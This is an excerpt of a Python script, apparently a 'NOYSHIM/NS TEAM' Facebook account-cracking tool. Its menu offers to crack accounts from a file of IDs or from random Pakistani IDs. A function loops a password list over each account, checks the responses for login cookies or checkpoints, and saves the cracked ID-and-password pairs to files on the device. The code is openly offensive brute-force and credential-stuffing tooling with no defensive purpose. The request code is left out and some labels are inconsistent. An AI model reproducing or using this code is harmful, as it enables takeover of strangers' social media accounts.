...
def fia():    
			print(logo)
			print('\x1b[1;91m>>> NOYSHIM/NS TEAM  VERSION :\x1b[1;92m 1.1 ')
			linex()
			print('[1] Crack File Clone\n[2] Crack Pakistan  Random Clone\n[0] Exit')
			linex()
			xd=input('[*] Choose an option: ')
			if xd in ['1','01']:
				os.system('clear')
				print(logo)
				print('Example : /sdcard/NOYSHIM.txt')
				linex()
				...
				os.system(f'xdg-open https://www.facebook.com/profile.php?id=100087361343283');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[NOYSHIM/ NS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in NOYSHIM:
				print('\r\r\033[1;31m[NOYSHIM-CP] %s | %s'%(ids,pas))
				
				open('/sdcard/NOYSHIM-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in NOYSHIM:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[NOYSHIM-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/NOYSHIM-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in NOYSHIM:
				...
				print('\r\r\033[1;32m[NOYSHIM-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[NOYSHIM-CP] '+ids+' | '+pas+'\033[1;97m')
...
def menu():
	...
	print('[2] Crack random Clone Method 2(BEST)')
